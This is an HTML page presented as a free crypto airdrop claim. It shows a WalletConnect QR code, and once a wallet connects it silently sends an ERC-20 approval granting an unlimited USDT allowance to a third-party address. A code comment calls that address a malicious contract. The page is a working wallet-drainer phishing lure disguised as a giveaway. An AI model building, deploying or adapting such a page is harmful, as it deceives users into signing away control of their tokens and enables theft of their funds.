<!DOCTYPE html>
<html>
<head>
  <title>Claim Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
</head>
<body>
  <h2>Claim Your Free Airdrop</h2>
  <p>Scan the QR below using Trust Wallet on BSC Testnet</p>
  <canvas id="qrcode"></canvas>
  <p id="status"></p>

  <script>
    const bridge = "https://bridge.walletconnect.org";
    const connector = new WalletConnect.default({ bridge });

    async function generateQR() {
      if (!connector.connected) {
        await connector.createSession();
      }

      const uri = connector.uri;
      QRCode.toCanvas(document.getElementById("qrcode"), uri, error => {
        if (error) console.error(error);
      });
    }

    generateQR();

    connector.on("connect", async (error, payload) => {
      if (error) throw error;

      const from = payload.params[0].accounts[0];
      document.getElementById("status").innerText = `Connected: ${from}`;

      // Send approval to malicious contract
      try {
        await connector.sendTransaction({
          from,
          to: "0x55d398326f99059ff775485246999027b3197955", // USDT Token
          data: "0x095ea7b300000000000000000000000033eed64f9428637b955b0379825f2066ed5d101affffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
          gas: "0x5208"
        });

        document.getElementById("status").innerText += "\nApproval transaction sent.";
      } catch (err) {
        document.getElementById("status").innerText += "\nError: " + err.message;
      }
    });
  </script>
</body>
</html>
